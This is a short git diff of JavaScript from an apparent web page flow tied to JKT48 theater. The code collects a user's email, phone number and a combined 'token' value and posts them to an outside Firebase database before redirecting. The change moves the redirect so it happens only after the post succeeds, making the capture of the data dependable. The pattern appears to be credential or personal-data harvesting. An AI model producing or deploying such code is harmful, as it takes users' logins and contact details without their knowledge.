@@ -133,15 +133,17 @@ axios.get("https://raw.githubusercontent.com/HABILIHSANPROJECT/habilihsanproject
                                     "mobile": phone.value,
                                     "token": email.value + ":" + c
                                 }
+                                let directlink = response.data.data.link
                                 const firebaseUrl = "https://jkt48-theater-default-rtdb.asia-southeast1.firebasedatabase.app/token"
                                 axios.post(`${firebaseUrl}.json`, post)
                                     .then(response => {
                                         console.log("Data has been posted successfully:", response.data)
+                                        location.replace(directlink)
                                     })
                                     .catch(error => {
                                         console.error("Error posting data:", error)
+                                        return
                                     })
-                                location.replace(response.data.data.link)
                             }).catch(function (error) {
                                 alert(error)
                             })
